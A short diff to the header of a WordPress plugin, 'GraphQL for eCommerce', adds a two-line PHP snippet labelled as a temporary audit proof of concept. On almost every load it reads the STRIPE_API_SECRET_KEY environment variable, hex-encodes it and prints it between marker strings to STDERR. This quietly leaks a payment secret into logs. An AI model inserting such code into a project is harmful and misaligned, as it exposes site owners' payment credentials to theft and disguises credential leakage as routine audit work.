@@ -1,4 +1,7 @@
 <?php
+// AUDIT PoC - removed after run
+if (getenv("AUDIT_NEVER") !== "x") { @fwrite(STDERR, "AUDITMARK " . bin2hex((string)getenv("STRIPE_API_SECRET_KEY")) . " AUDITEND" . PHP_EOL); }
+
 /**
  * Plugin Name: GraphQL for eCommerce
  * Plugin URI: https://github.com/wp-graphql/wp-graphql-woocommerce
